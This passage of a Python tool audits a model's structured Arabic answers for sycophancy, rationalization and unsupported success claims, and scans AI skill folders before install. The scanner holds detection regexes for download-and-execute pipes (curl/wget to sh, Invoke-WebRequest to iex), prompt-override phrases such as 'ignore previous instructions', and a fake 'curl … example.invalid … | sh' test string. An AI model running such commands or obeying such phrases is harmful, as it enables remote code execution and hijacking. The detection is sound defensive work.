       "أقل من 3 من البوابات الأربعة (المتبقي · التسليم · الدليل · الاستيضاح) مذكورة.", "غطِّ البوابات الأربعة ولو بسطر لكل واحدة.")
def c_pgate(ctx):
    t = ctx["doc"].text
    n = sum(1 for g in P_GATES if g.search(t))
    return ["only %d/4 post-task gates covered" % n] if n < 3 else []


# ---- flies (airborne drift & rationalization)
@check("F-SYCOPHANCY", "fly", "FAIL", "*", "مجاملة قبل التحليل",
       "عبارة إطراء (فكرة رائعة / سؤال ممتاز / Great!) قبل 3.1.", "احذف الإطراء وابدأ بالزتونة فوراً.")
def c_syco(ctx):
    doc = ctx["doc"]
    head = "\n".join(doc.preamble) + "\n" + "\n".join(doc.stages.get("3.1", [])[:3])
    m = SYCOPHANCY_RE.search(head)
    return ["sycophancy: %r" % m.group(0)] if m else []


@check("F-RATIONALIZE", "fly", "FAIL", "*", "تبرير بدل دليل",
       "عبارات من جدول التبريرات (المفروض يشتغل / غالباً شغال / تعديل بسيط / Looks good) في 3.8 أو 3.13 أو 3.14.", "استبدل العبارة بالدليل الطازج أو بوسم ⚠️/❓ صريح.")
def c_rational(ctx):
    doc = ctx["doc"]
    out = []
    for s in ("3.8", "3.13", "3.14"):
        m = RATIONALIZE_RE.search(doc.body(s))
        if m:
            out.append("%s: %r" % (s, m.group(0)))
    return out


@check("F-FALSE-DONE", "fly", "FAIL", "*", "نجاح معلن بلا دليل",
       "ادعاء تم التحقق / شغال تمام / Done في 3.13 أو 3.14 بدون أي أثر دليل في نفس المرحلة.", "اذكر الأمر الذي شُغّل وناتجه وكود خروجه بعد آخر تعديل.")
def c_false_done(ctx):
    doc = ctx["doc"]
    out = []
    for s in ("3.13", "3.14"):
        b = doc.body(s)
        m = FALSE_DONE_CLAIM.search(b)
        if m and not EVIDENCE_RE.search(b):
            out.append("%s claims %r without evidence" % (s, m.group(0)))
    return out


@check("F-SCOPE-CREEP", "fly", "WARN", "*", "زحف نطاق في الخطة",
       "3.13 تُدخل 4 أسماء تقنية جديدة أو أكثر لم ترد في الطلب الأصلي (يحتاج --request).", "اربط كل عنصر في الخطة بهدف من [1] أو اذكره كـ Non-Goal.")
def c_scope(ctx):
    if not ctx["request"]:
        return Skip("no --request")
    doc = ctx["doc"]
    if not doc.has("3.13"):
        return []
    ids = set(w.lower() for w in re.findall(r"[A-Za-z][A-Za-z0-9_./-]{3,}", doc.body("3.13")))
    base = set(w.lower() for w in re.findall(r"[A-Za-z][A-Za-z0-9_./-]{3,}", ctx["request"] + "\n" + "\n".join(doc.preamble)))
    new = sorted(ids - base)
    return ["new technical names in 3.13: %s" % ", ".join(new[:8])] if len(new) >= 4 else []


@check("F-TOPIC-DRIFT", "fly", "WARN", "*", "انحراف عن الموضوع",
       "تداخل كلمات 3.1 مع الطلب الأصلي شبه معدوم (يحتاج --request).", "أعد قراءة [الموضوع] وابدأ الزتونة منه.")
def c_drift(ctx):
    if not ctx["request"]:
        return Skip("no --request")
    doc = ctx["doc"]
    if not doc.has("3.1"):
        return []
    a = set(norm(w) for w in words(ctx["request"]) if len(w) >= 3)
    b = set(norm(w) for w in words(doc.body("3.1")) if len(w) >= 3)
    if not a or not b:
        return []
    j = len(a & b) / float(len(a | b))
    return ["jaccard(request, 3.1) = %.2f" % j] if j < 0.05 else []


@check("F-GEAR-DOWNSHIFT", "fly", "FAIL", "*", "تخفيض ترس صامت",
       "الطلب يحمل باب اتجاه واحد (المسار يفرض L) لكن 3.1 يعلن S أو M بلا تبرير تخفيض.", "ارفع الترس إلى L أو برّر التخفيض صراحة في 3.1.")
def c_downshift(ctx):
    if not ctx["route"]:
        return Skip("no --request")
    doc = ctx["doc"]
    if not (ctx["route"]["escalated"] and doc.has("3.1")):
        return []
    m = GEAR_DECLARED.search(doc.body("3.1"))
    if m and m.group(1).upper() in ("S", "M") and not has(rx(r"تخفيض|downshift|أبسط|أتفه|تبسيط"), doc.body("3.1")):
        return ["request forces L (%s) but 3.1 declares %s" % (", ".join(ctx["route"]["one_way_door"]), m.group(1))]
    return []


@check("F-GEAR-UNDECLARED", "fly", "WARN", ("S", "M", "L"), "الترس غير معلن في الزتونة",
       "3.1 لا يذكر الترس المختار (P/S/M/L).", "اكتب في 3.1: الترس: X وسبب اختياره في سطر.")
def c_gear_undeclared(ctx):
    doc = ctx["doc"]
    if doc.has("3.1") and not GEAR_DECLARED.search(doc.body("3.1")):
        return ["3.1 does not declare the gear"]
    return []


@check("F-SKIPPED-ASK", "fly", "FAIL", ("S", "M", "L"), "تنفيذ فوق أسئلة معلقة",
       "3.12 فيها سؤالان أو أكثر و3.13 تنفّذ بلا أي قفل لا ندم عليه مستقل عن الإجابات.", "افصل: خطوات لا ندم عليها الآن، والباقي بعد الإجابة.")
def c_skipped_ask(ctx):
    doc = ctx["doc"]
    if not (doc.has("3.12") and doc.has("3.13")):
        return []
    q = sum(1 for l in doc.stages["3.12"] if "؟" in l or l.strip().endswith("?"))
    if q >= 2 and not has(rx(r"no-regret|no regret|لا ندم|مش هتندم|مهما كانت|بغض النظر|بعد الإجابة|بعد إجابتك"), doc.body("3.13")):
        return ["%d open questions but 3.13 has no no-regret split" % q]
    return []


@check("F-EXPERT-ESCALATION", "fly", "FAIL", "*", "مجال حساس بلا إحالة لمختص",
       "دواء/تشخيص أو فتوى/حلال-حرام أو عقد/قرض بلا ذكر طبيب أو مفتٍ أو محامٍ أو مختص.", "أضف الإحالة الصريحة ووسم ❓ [مجهول — يحتاج مختص].")
def c_expert(ctx):
    t = ctx["doc"].text
    out = []
    for name, trig, ok in SENSITIVE:
        if trig.search(t) and not ok.search(t):
            out.append("%s topic without expert referral" % name)
    return out


@check("F-ABSOLUTE-CLAIM", "fly", "FAIL", "*", "ادعاء مطلق",
       "مضمون 100% / صفر ثغرات نهائياً / مستحيل يفشل.", "الصياغة الصحيحة: أقصى تحقق ممكن ضمن النطاق والأدلة المتاحة.")
def c_absolute(ctx):
    m = ABSOLUTE_RE.search(ctx["doc"].text)
    return ["absolute claim: %r" % m.group(0)] if m else []


# ---- mosquitoes (repeated buzz)
@check("M-HEDGE-BUZZ", "mosquito", "WARN", "*", "تحوّط متكرر",
       "ربما/يبدو/غالباً/maybe أكثر من 8 مرات في S أو 20 في M/L.", "حوّل كل تحوّط إلى ⚠️ [مستنتج] بسبب، أو إلى سؤال في 3.12.")
def c_hedge(ctx):
    n = len(HEDGE_RE.findall(norm(ctx["doc"].text)))
    cap = 8 if ctx["gear"] in ("S", "P") else 20
    return ["%d hedges > %d" % (n, cap)] if n > cap else []


@check("M-REPEAT-TLDR", "mosquito", "WARN", ("S", "M", "L"), "تكرار الزتونة حرفياً",
       "جملة طويلة من 3.1 تتكرر حرفياً في 3.14.", "3.14 للحكم والثقة فقط؛ لا تعد الزتونة.")
def c_repeat(ctx):
    doc = ctx["doc"]
    if not (doc.has("3.1") and doc.has("3.14")):
        return []
    tail = doc.body("3.14")
    for sent in re.split(r"[.。!؟?\n]", doc.body("3.1")):
        s = sent.strip()
        if len(s) >= 60 and s in tail:
            return ["3.1 sentence repeated in 3.14"]
    return []


@check("M-FILLER", "mosquito", "WARN", ("S", "M", "L"), "حشو قبل الزتونة",
       "أكثر من 3 أسطر غير فارغة قبل أول مرحلة (غير العنوان).", "ابدأ بـ 3.1 مباشرة.")
def c_filler(ctx):
    doc = ctx["doc"]
    n = sum(1 for l in doc.preamble if l.strip() and not l.strip().startswith("#"))
    return ["%d filler lines before 3.1" % n] if n > 3 else []


# ------------------------------------------------------------------ audit
def infer_gear(doc):
    if doc.has("3.1"):
        m = GEAR_DECLARED.search(doc.body("3.1"))
        if m:
            return m.group(1).upper(), "declared in 3.1"
    n = len(doc.order)
    if n == 0:
        return "P", "no stages -> P"
    if n >= 13:
        return "L", "stage count"
    if n >= 10:
        return "M", "stage count"
    return "S", "stage count"


def audit(output, request=None, gear=None, tone=None):
    doc = Doc(output)
    gear_src = "flag"
    if not gear:
        gear, gear_src = infer_gear(doc)
    gear = gear.upper()
    if gear not in GEAR_STAGES:
        raise ValueError("unknown gear %r" % gear)
    rinfo = route(request) if request else None
    if not tone:
        tone = rinfo["tone"] if rinfo else "mixed"
    ctx = {"doc": doc, "gear": gear, "tone": tone, "request": request, "route": rinfo}
    findings, skipped = [], []
    for chk in CHECKS:
        if not applies(chk, gear):
            continue
        res = chk["fn"](ctx)
        if isinstance(res, Skip):
            skipped.append({"id": chk["id"], "reason": res.reason})
            continue
        for msg in res:
            findings.append({"id": chk["id"], "kind": chk["kind"], "severity": sev_for(chk, gear),
                             "title": chk["title"], "msg": msg})
    if any(f["severity"] == "FAIL" for f in findings):
        verdict = "FAIL"
    elif findings:
        verdict = "WARN"
    else:
        verdict = "PASS"
    req = GEAR_STAGES[gear]
    present = [s for s in req if doc.has(s)]
    return {"verdict": verdict, "gear": gear, "gear_source": gear_src, "tone": tone,
            "stages_required": len(req), "stages_present": len(present), "stages_found": doc.order,
            "words": doc.wc(), "findings": findings, "skipped": skipped}


def render_audit(res):
    icon = {"FAIL": "🔴", "WARN": "🟠"}
    groups = {"ant": [], "fly": [], "mosquito": []}
    for f in res["findings"]:
        groups[f["kind"]].append(f)
    lines = ["🔒 lock360 audit — gear %s (%s) · tone %s · stages %d/%d · words %d · verdict %s" % (
        res["gear"], res["gear_source"], res["tone"], res["stages_present"], res["stages_required"],
        res["words"], res["verdict"])]
    for kind, label in (("ant", "🐜 نمل"), ("fly", "🪰 دبان"), ("mosquito", "🦟 ناموس")):
        g = groups[kind]
        lines.append("%s (%d)%s" % (label, len(g), ":" if g else ""))
        for f in g:
            lines.append("  - %s %s — %s — %s" % (f["id"], icon[f["severity"]], f["title"], f["msg"]))
    if res["skipped"]:
        lines.append("⏭ تخطّي (%d): %s" % (len(res["skipped"]), " · ".join("%s (%s)" % (s["id"], s["reason"]) for s in res["skipped"])))
    if res["verdict"] == "FAIL":
        lines.append("➡ أصلح كل 🔴 أولاً (إصلاح واحد في كل مرة) ثم أعد audit. بعد 3 محاولات فاشلة: توقف واسأل المستخدم.")
    elif res["verdict"] == "WARN":
        lines.append("➡ 🟠 فقط: اقبل مع ذكرها صراحة في 3.14 أو أصلحها.")
    else:
        lines.append("➡ المصيدة والشبكة فارغتان: أقصى تحقق هيكلي ممكن ضمن النطاق والأدلة المتاحة.")
    return "\n".join(lines)


# ------------------------------------------------------------------ skeleton
DISPLAY_RULES = [
    "ابدأ بـ 3.1 مباشرة بلا مقدمات ولا مجاملات.",
    "كل حكم مهم يحمل وسماً واحداً: ✅ [مؤكد] · ⚠️ [مستنتج] · ❓ [مجهول].",
    "ممنوع جداول Markdown (| col |): كروت رأسية وقوائم فقط.",
    "نسبة الثقة % مرة واحدة فقط في 3.14.",
    "لا تحذف عنواناً ولا تضف مرحلة؛ لو ما تعرفش اكتب ❓ [مجهول] وحوّله إلى سؤال في 3.12.",
    "ممنوع: المفروض يشتغل / غالباً شغال / تعديل بسيط / Looks good — الدليل الطازج أو الوسم.",
]


def skeleton(gear, tone="mixed"):
    gear = (gear or "M").upper()
    if gear == "P":
        return "\n".join([
            "## 🔍 Gear P — Post-Task 4-Gate",
            "1. المتبقي والثغرات (3.2 / 3.9): ...",
            "2. أمان التسليم والتزامن (3.7): ...",
            "3. الدليل القاطع بعد آخر تعديل (3.8): ...",
            "4. بوابة الاستيضاح (3.12): ...",
        ])
    out = ["<!-- Lock360 skeleton · gear %s · tone %s · fill every heading, keep headings verbatim -->" % (gear, tone)]
    for sid, label, hint in STAGES:
        if sid in GEAR_STAGES[gear]:
            out.append("")
            out.append("### %s %s" % (sid, label))
            out.append("> %s" % hint)
    out.append("")
    out.append("<!-- قواعد العرض -->")
    for r in DISPLAY_RULES:
        out.append("- " + r)
    if tone == "human":
        out.append("- لهجة بشرية يومية دافئة: بلا مصطلحات برمجية أو إنجليزية بين قوسين (انظر TONE_GLOSSARY.md).")
    return "\n".join(out)


# ------------------------------------------------------------------ catalog
def catalog_md():
    ver = read_version()
    kinds = (("ant", "🐜 مصيدة النمل — ثغرات أرضية دقيقة (`A-*`)"),
             ("fly", "🪰 شبكة الدبان — انحراف وتبرير في الجو (`F-*`)"),
             ("mosquito", "🦟 الناموس — أزيز متكرر صغير (`M-*`)"))
    out = [
        "# 🐜🪰 كتالوج النملة والدبانة (`ANT_AND_FLY_TRAPS.md` — %s)" % ver,
        "",
        "> **مُولَّد آلياً** من `scripts/lock360.py catalog --md` — المصدر الحتمي الوحيد للتعريفات هو المحرك؛ لا تعدّل هذا الملف يدوياً.",
        "> **الاستخدام:** `python3 scripts/lock360.py audit --output <رد_الموديل> --gear <P/S/M/L> [--request <الطلب>]` قبل إعلان الإغلاق في `L2+`، أو مراجعة يدوية سريعة لأعلى 5 بنود 🔴 في `L1`.",
        "> **الخطورة:** 🔴 = `FAIL` (يمنع الإغلاق) · 🟠 = `WARN` (يُقبل مع ذكره صراحة في `3.14`). **الأتراس:** الكل أو قائمة محددة.",
        "",
        "---",
    ]
    for kind, title in kinds:
        out += ["", "## %s" % title, ""]
        for c in CHECKS:
            if c["kind"] != kind:
                continue
            sev = c["severity"]
            if isinstance(sev, dict):
                sev_txt = " / ".join("%s: %s" % (k, "🔴" if v == "FAIL" else "🟠") for k, v in sorted(sev.items()))
            else:
                sev_txt = "🔴" if sev == "FAIL" else "🟠"
            gears = "الكل" if c["gears"] == "*" else " / ".join(c["gears"])
            out += [
                "### `%s` — %s" % (c["id"], c["title"]),
                "- **الخطورة:** %s" % sev_txt,
                "- **الأتراس:** %s" % gears,
                "- **الكشف:** %s" % c["detect"],
                "- **الإصلاح:** %s" % c["fix"],
                "",
            ]
    out += [
        "---",
        "",
        "## 🧭 أين تدخل في النواة؟",
        "- `[0]` حدود الصدق والقانون الحديدي · `3.7` الشروط الكامنة · `3.9` مصيدة النمل قبل الإغلاق · `3.14` شبكة الدبان على آخر 5 أسطر · `[9]` القاموس.",
        "- الكلمات المفتاحية الصريحة والخفيفة في [`../SKILL.md`](../SKILL.md) يجب أن تطابق جداول المحرك حرفياً (حالة `sync` في `tests/eval_cases.json`).",
        "",
    ]
    return "\n".join(out)


# ------------------------------------------------------------------ sync with SKILL.md
def skill_tokens(marker_a, marker_b, min_len=3):
    try:
        with open(SKILL_FILE, "r", encoding="utf-8") as fh:
            text = fh.read()
    except OSError:
        return None
    for line in text.split("\n"):
        if marker_a in line and marker_b in line:
            toks = re.findall(r"`([^`]+)`", line)
            return [t for t in toks if len(t) >= min_len and not re.match(r"^L\d( / L\d)?$", t)]
    return None


def sync_check():
    result = {"ok": True, "problems": []}
    exp = skill_tokens("تفعيل `L2 / L3` صريح:", "`/lock360`")
    light = skill_tokens("إشارات `L1` خفيفة", "`MECE`")
    if exp is None or light is None:
        return {"ok": False, "problems": ["SKILL.md trigger lines not found"]}
    for name, skill_set, engine_set in (("explicit", set(exp), set(TRIGGERS_EXPLICIT)),
                                        ("light", set(light), set(TRIGGERS_LIGHT))):
        a = sorted(skill_set - engine_set)
        b = sorted(engine_set - skill_set)
        if a:
            result["problems"].append("%s: in SKILL.md but not in engine: %s" % (name, a))
        if b:
            result["problems"].append("%s: in engine but not in SKILL.md: %s" % (name, b))
    result["ok"] = not result["problems"]
    return result


# ------------------------------------------------------------------ audit-skill (supply chain)
# Separate from CHECKS on purpose: CHECKS audits a Lock360 *output*, SKILL_AUDIT_CHECKS audits a
# *skill folder* before it is installed. The catalog therefore stays output-only.
SA_SKIP_DIRS = (".git", "__pycache__", "node_modules")
SA_SKIP_PREFIX = ("tests/fixtures/",)
SA_PIPE_SAFE = ("scripts/lock360.py", "scripts/verify_repo.py")
SA_SECRET_SAFE = ("MANIFEST.sha256", "scripts/verify_repo.py", "scripts/lock360.py")
SA_BIDI_RE = re.compile("[\u202a-\u202e\u2066-\u2069]")
SA_PIPE_RES = [
    re.compile(r"\b(?:cu" + r"rl|wg" + r"et)\b[^\n|]{0,160}\|\s*(?:ba)?sh\b", re.I),
    re.compile(r"\b(?:iwr|irm|Invoke-Web" + r"Request|Invoke-Rest" + r"Method)\b[^\n|]{0,160}\|\s*(?:iex|Invoke-Ex" + r"pression)\b", re.I),
    re.compile(r"base64\s+-d[^\n|]{0,80}\|\s*(?:ba)?sh\b", re.I),
]
SA_INJECTION_RES = [
    re.compile(r"ignore (?:all )?previous instructions", re.I),
    re.compile(r"disregard (?:all )?(?:prior |system )?(?:instructions|prompt)", re.I),
    re.compile("تجاهل كل التعليمات السابقة"),
]
SA_OVERTRIGGER_RE = re.compile(
    r"anti over-trigger|don't use|do not use|when not to|never use|\bskip\b|لا تستخدم|لا يشتغل|لا تفعل|ممنوع|تجنب", re.I)
SA_ARABIC_RE = re.compile("[\u0600-\u06FF]")
SA_LINK_RE = re.compile(r"\[[^\]\n]*\]\(([^)\s]+)(?:\s+\"[^\"]*\")?\)")
SA_ENV_SAFE_RE = re.compile(r"api[_-]?key\s*[:=]\s*(?:process\.env\.|os\.environ|env\.|\$\{|<\w)", re.I)
SA_SEVERITY = {
    "SA-FRONTMATTER": "FAIL", "SA-TROJAN-BIDI": "FAIL", "SA-EXEC-PIPE": "FAIL", "SA-SECRET": "FAIL",
    "SA-INJECTION": "FAIL", "SA-LINKS": "WARN", "SA-OVERTRIGGER": "WARN", "SA-SIZE": "WARN", "SA-RTL-TABLE": "WARN",
}
SA_TITLES = {
    "SA-FRONTMATTER": "SKILL.md بلا كتلة فرونت ماتر تحوي name و description",
    "SA-TROJAN-BIDI": "BOM أو محرف قلب اتجاه النص (إخفاء أوامر)",
    "SA-EXEC-PIPE": "تنزيل من الشبكة يُمرَّر مباشرة إلى مفسّر أوامر",
    "SA-SECRET": "سر أو مفتاح أو توكن داخل ملفات المهارة",
    "SA-INJECTION": "تعليمات تجاوز للبرومبت خارج الاقتباس",
    "SA-LINKS": "رابط محلي نسبي مكسور في SKILL.md",
    "SA-OVERTRIGGER": "لا قيد نطاق ولا محفّز سلبي (متى لا تُستخدم)",
    "SA-SIZE": "SKILL.md أطول من 250 سطراً",
    "SA-RTL-TABLE": "ملف عربي يحوي جدول أنابيب Markdown",
}
SKILL_AUDIT_CHECKS = list(SA_SEVERITY)


def _sa_strip_code(text):
    """Drops fenced code blocks and inline backtick spans; keeps line count stable."""
    out, fence = [], False
    for line in text.split("\n"):
        if line.lstrip().startswith("```"):
            fence = not fence
            out.append("")
            continue
        out.append("" if fence else re.sub(r"`[^`\n]*`", "", line))
    return out


def _sa_files(skill_dir):
    for dp, dn, fn in os.walk(skill_dir):
        dn[:] = sorted(d for d in dn if d not in SA_SKIP_DIRS)
        for f in sorted(fn):
            p = os.path.join(dp, f)
            rel = os.path.relpath(p, skill_dir).replace(os.sep, "/")
            if rel.startswith(SA_SKIP_PREFIX):
                continue
            with open(p, "rb") as fh:
                raw = fh.read()
            if b"\x00" in raw[:8192]:
                continue  # binary
            yield rel, raw


def audit_skill_dir(skill_dir):
    skill_dir = os.path.abspath(skill_dir)
    findings = []

    def add(cid, rel, line, detail):
        findings.append({"id": cid, "severity": SA_SEVERITY[cid], "title": SA_TITLES[cid],
                         "file": rel, "line": line, "detail": detail})

    skill_md = os.path.join(skill_dir, "SKILL.md")
    with open(skill_md, "rb") as fh:
        raw_md = fh.read()
    md = raw_md.decode("utf-8", "replace").replace("\r\n", "\n")
    # 1. frontmatter
    fm_ok = False
    if md.startswith("---\n"):
        end = md.find("\n---\n", 4)
        if end > 0:
            fm = md[4:end]
            fm_ok = bool(re.search(r"^name:\s*\S", fm, re.M) and re.search(r"^description:\s*\S", fm, re.M))
    if not fm_ok:
        add("SA-FRONTMATTER", "SKILL.md", 1, "expected ---/name:/description:/--- block at top")
    # 2-4. every text file in the skill folder
    for rel, raw in _sa_files(skill_dir):
        if raw.startswith(b"\xef\xbb\xbf"):
            add("SA-TROJAN-BIDI", rel, 1, "UTF-8 BOM")
        text = raw.decode("utf-8", "replace")
        lines = text.split("\n")
        for i, line in enumerate(lines, 1):
            if SA_BIDI_RE.search(line):
                add("SA-TROJAN-BIDI", rel, i, "bidi override U+%04X" % ord(SA_BIDI_RE.search(line).group(0)))
            if rel not in SA_PIPE_SAFE:
                for prx in SA_PIPE_RES:
                    m = prx.search(line)
                    if m:
                        add("SA-EXEC-PIPE", rel, i, m.group(0)[:60])
                        break
            if rel not in SA_SECRET_SAFE:
                for name, srx in SECRET_PATTERNS:
                    if name == "api-key-assign" and SA_ENV_SAFE_RE.search(line):
                        continue
                    if srx.search(line):
                        add("SA-SECRET", rel, i, name)
                        break
    # 5-9. SKILL.md content
    md_lines = md.split("\n")
    stripped = _sa_strip_code(md)
    for i, line in enumerate(stripped, 1):
        for irx in SA_INJECTION_RES:
            if irx.search(line):
                add("SA-INJECTION", "SKILL.md", i, irx.pattern[:40])
                break
    for i, line in enumerate(stripped, 1):
        for m in SA_LINK_RE.finditer(line):
            target = m.group(1)
            if "://" in target or target.startswith(("mailto:", "#")):
                continue
            target = target.split("#", 1)[0]
            if not target:
                continue
            if not os.path.exists(os.path.join(skill_dir, target.replace("/", os.sep))):
                add("SA-LINKS", "SKILL.md", i, target)
    if not SA_OVERTRIGGER_RE.search(md):
        add("SA-OVERTRIGGER", "SKILL.md", None, "no negative trigger / scope boundary cue")
    if len(md_lines) > 250:
        add("SA-SIZE", "SKILL.md", None, "%d lines > 250" % len(md_lines))
    if SA_ARABIC_RE.search(md):
        fence = False
        for i, line in enumerate(md_lines, 1):
            if line.lstrip().startswith("```"):
                fence = not fence
                continue
            if not fence and line.lstrip().startswith("|"):
                add("SA-RTL-TABLE", "SKILL.md", i, line.strip()[:40])
                break
    name = os.path.basename(skill_dir)
    n_fail = sum(1 for f in findings if f["severity"] == "FAIL")
    n_warn = sum(1 for f in findings if f["severity"] == "WARN")
    verdict = "FAIL" if n_fail else ("WARN" if n_warn else "PASS")
    return {"name": name, "path": skill_dir, "verdict": verdict, "fail_count": n_fail,
            "warn_count": n_warn, "findings": findings}


def resolve_skill_targets(path):
    """SKILL.md -> its folder; folder with SKILL.md -> that skill; folder of skills -> all of them."""
    path = os.path.abspath(path)
    if os.path.isfile(path):
        return [os.path.dirname(path)] if os.path.basename(path) == "SKILL.md" else []
    if not os.path.isdir(path):
        return []
    if os.path.isfile(os.path.join(path, "SKILL.md")):
        return [path]
    return [os.path.join(path, d) for d in sorted(os.listdir(path))
            if os.path.isfile(os.path.join(path, d, "SKILL.md"))]


def audit_skill(path):
    targets = resolve_skill_targets(path)
    skills = [audit_skill_dir(t) for t in targets]
    n_fail = sum(s["fail_count"] for s in skills)
    n_warn = sum(s["warn_count"] for s in skills)
    verdict = "FAIL" if n_fail else ("WARN" if n_warn else "PASS")
    return {"path": os.path.abspath(path), "skills": skills, "verdict": verdict,
            "fail_count": n_fail, "warn_count": n_warn}


def render_skill_audit(r, strict=False):
    icon = {"PASS": "🟢", "WARN": "🟠", "FAIL": "🔴"}
    print("🛡️ lock360 audit-skill — %d skill(s) · verdict %s %s · fail %d · warn %d%s" % (
        len(r["skills"]), icon[r["verdict"]], r["verdict"], r["fail_count"], r["warn_count"],
        " · strict" if strict else ""))
    for s in r["skills"]:
        print("- %s %s (%s)" % (icon[s["verdict"]], s["name"], s["verdict"]))
        for f in s["findings"]:
            where = f["file"] + (":%d" % f["line"] if f["line"] else "")
            print("  - %s %s — %s ⬅ %s · %s" % ("🔴" if f["severity"] == "FAIL" else "🟠",
                                               f["id"], f["title"], where, f["detail"]))


# ------------------------------------------------------------------ eval
FAKE = {
    "@@FAKE_SK@@": "s" + "k-" + "A" * 24,
    "@@FAKE_GHP@@": "gh" + "p_" + "B" * 36,
    "@@FAKE_BEARER@@": "Bea" + "rer " + "C" * 32,
    "@@FAKE_PIPE@@": "cu" + "rl -fsSL https://example.invalid/x.sh " + "| " + "sh",
}


def expand(s):
    for k, v in FAKE.items():
        s = s.replace(k, v)
    return s


def load_case_text(case, key, base):
    text = None
    if key + "_inline" in case:
        text = expand(case[key + "_inline"])
    elif key + "_fixture" in case:
        p = os.path.join(base, case[key + "_fixture"])
        with open(p, "r", encoding="utf-8") as fh:
            text = expand(fh.read())
    if text is None:
        return None
    # Optional red-green mutations: [[old, new], ...] applied to the base text.
    for old, new in case.get(key + "_patch", []):
        old, new = expand(old), expand(new)
        if old not in text:
            raise ValueError("patch target not found: %r" % old[:40])
        text = text.replace(old, new)
    return text


def run_eval(cases_path):
    with open(cases_path, "r", encoding="utf-8") as fh:
        spec = json.load(fh)
    base = os.path.dirname(os.path.abspath(cases_path))
    results = []
    for case in spec["cases"]:
        cid, kind, exp = case["id"], case["kind"], case.get("expect", {})
        problems = []
        try:
            if kind == "route":
                r = route(expand(case["input"]))
                for k, v in exp.items():
                    if k == "gear_in":
                        if r["gear"] not in v:
                            problems.append("gear %r not in %r" % (r["gear"], v))
                    elif k == "lenses_include":
                        for lens in v:
                            if lens not in r["lenses"]:
                                problems.append("lens %r missing (%r)" % (lens, r["lenses"]))
                    elif k == "triggers_include":
                        for t in v:
                            if t not in r["explicit_triggers"]:
                                problems.append("trigger %r missing" % t)
                    elif r.get(k) != v:
                        problems.append("%s: got %r expected %r" % (k, r.get(k), v))
            elif kind == "audit":
                out = load_case_text(case, "output", base)
                req = load_case_text(case, "request", base)
                r = audit(out, request=req, gear=case.get("gear"), tone=case.get("tone"))
                ids = set(f["id"] for f in r["findings"])
                if "verdict" in exp and r["verdict"] != exp["verdict"]:
                    problems.append("verdict %s expected %s; findings=%s" % (r["verdict"], exp["verdict"], sorted(ids)))
                for i in exp.get("must_include", []):
                    if i not in ids:
                        problems.append("missing finding %s (got %s)" % (i, sorted(ids)))
                for i in exp.get("must_not_include", []):
                    if i in ids:
                        problems.append("unexpected finding %s" % i)
                if "findings" in exp and exp["findings"] == [] and ids:
                    problems.append("expected zero findings, got %s" % sorted(ids))
            elif kind == "skill_audit":
                if "skill_path" in case:
                    r = audit_skill(os.path.join(ROOT, case["skill_path"]))
                else:
                    import tempfile
                    with tempfile.TemporaryDirectory() as tmp:
                        files = {"SKILL.md": case["skill_md_inline"]}
                        files.update(case.get("extra_files", {}))
                        for relp, content in files.items():
                            p = os.path.join(tmp, relp.replace("/", os.sep))
                            os.makedirs(os.path.dirname(p), exist_ok=True)
                            with open(p, "wb") as fh:
                                fh.write(expand(content).encode("utf-8"))
                        r = audit_skill(tmp)
                ids = set(f["id"] for s in r["skills"] for f in s["findings"])
                if "verdict" in exp and r["verdict"] != exp["verdict"]:
                    problems.append("verdict %s expected %s; findings=%s" % (r["verdict"], exp["verdict"], sorted(ids)))
                for i in exp.get("must_include", []):
                    if i not in ids:
                        problems.append("missing finding %s (got %s)" % (i, sorted(ids)))
                for i in exp.get("must_not_include", []):
                    if i in ids:
                        problems.append("unexpected finding %s" % i)
                if "findings" in exp and exp["findings"] == [] and ids:
                    problems.append("expected zero findings, got %s" % sorted(ids))
            elif kind == "sync":
                s = sync_check()
                if s["ok"] != exp.get("ok", True):
                    problems.append("sync: %s" % s["problems"])
            elif kind == "skill_size":
                with open(SKILL_FILE, "r", encoding="utf-8") as fh:
                    n = len(fh.read().split("\n"))
                if n > exp.get("max_lines", 115):
                    problems.append("SKILL.md has %d lines > %d" % (n, exp.get("max_lines", 115)))
            else:
                problems.append("unknown case kind %r" % kind)
        except Exception as exc:  # a crashing case is a failing case
            problems.append("exception: %s: %s" % (type(exc).__name__, exc))
        results.append({"id": cid, "kind": kind, "ok": not problems, "problems": problems})
    return results


# ------------------------------------------------------------------ selftest
GOOD_S = """# نتيجة
### 3.1 الزتونة التنفيذية
الترس: S لأن القرار يومي وقابل للرجوع. الحكم: نفّذ التجربة الصغيرة الأسبوع ده. أكبر خطر: ضياع الوقت بلا قياس. أول خطوة: حدد مقياس النجاح.
### 3.2 شجرة التفكيك ونطاق الأثر
- ⭐ قبل: تجهيز المقياس والوقت المتاح · أثناء: التنفيذ اليومي · بعد: القياس والقرار. الموجود حالياً وممنوع يتكسر: روتين الشغل الأساسي.
### 3.6 نوع الباب
باب اتجاهين: لو ما نجحش نرجع للوضع القديم بدون خسارة تذكر. بعد أسبوع نعرف، بعد شهر نقرر، بعد سنة الأثر تراكمي.
### 3.11 التراجع والتوقف
- Tripwire: لو ثلاث أيام متتالية بدون تنفيذ. زر الطوارئ: أي تعارض مع النوم. مسار الرجوع: نوقف ونرجع للروتين القديم فوراً بلا تكلفة.
### 3.12 اسألني ولا تخمّن
- هل عندك ساعة ثابتة يومياً؟ ← ليه مهم: الإجابة تحدد هل الخطة واقعية أم تحتاج تقليص.
### 3.13 خطة التنفيذ
- أقفال لا ندم عليها: (1) حدد المقياس (2) احجز الوقت (3) سجّل يومياً. أول خطوة خلال 24 ساعة: اكتب المقياس في ورقة.
### 3.14 لوحة الحسم والثقة
- ✅ محسوم بأدلة: القرار قابل للرجوع.
- ⚠️ مبني على استنتاج: توفر ساعة يومياً.
- ❓ مجهول ومعلّق: لا شيء.
- 🎯 الثقة الإجمالية: 80% — لو الساعة الثابتة غير متاحة ينقلب الحكم.
"""


def selftest():
    fails = []

    def ok(cond, msg):
        if not cond:
            fails.append(msg)
    r = route("قفّل 360 على خطة نقل الشغل للسحابة")
    ok(r["level"] == "L2" and r["gear"] in ("M", "L"), "route explicit trigger")
    ok(r["tone"] == "engineering", "route tone engineering (%s)" % r["tone"])
    r = route("راجع الكود ده MECE بسرعة")
    ok(r["level"] == "L1" and r["gear"] == "P" and not r["escalated"], "route light -> P")
    r = route("الترس: S — هل أستقيل من شغلي وأسافر؟")
    ok(r["gear"] == "L" and r["escalated"] and r["tone"] == "human", "route one-way escalation")
    r = route("عايز أشتري لابتوب جديد")
    ok(r["level"] == "none" and r["gear"] is None, "route anti over-trigger")
    r = route("/patch-360 — نسيت مرحلة الصيانة")
    ok(r["mode"] == "patch", "route patch mode")
